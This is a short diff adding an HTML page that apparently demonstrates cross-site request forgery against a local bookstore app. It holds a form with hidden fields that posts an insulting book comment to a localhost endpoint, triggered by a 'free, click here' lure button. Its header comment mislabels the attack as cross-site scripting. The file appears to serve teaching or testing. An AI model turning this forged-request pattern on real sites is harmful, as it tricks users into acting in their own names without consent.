@@ -1,0 +1,18 @@
+﻿<!DOCTYPE html>
+@*
+   FUNCIONALIDADE DE CROSS-SITE SCRIPTING (XSRF)
+*@
+<html>
+    <head>
+        <title>title</title>
+    </head>
+    <body>
+        <div>
+            <form method="post" action="http://localhost:1123/Comentarios/AdicionarComentario">
+                <input id="livroId" name="livroId" type="hidden" value="1"/>
+                <input id="comentario" name="comentario" type="hidden" value="Este livro é uma bela porcaria (XSRF)"/>
+                <button type="submit">É grátis, pode clicar!!! :-)</button>
+            </form>
+        </div>
+    </body>
+</html>
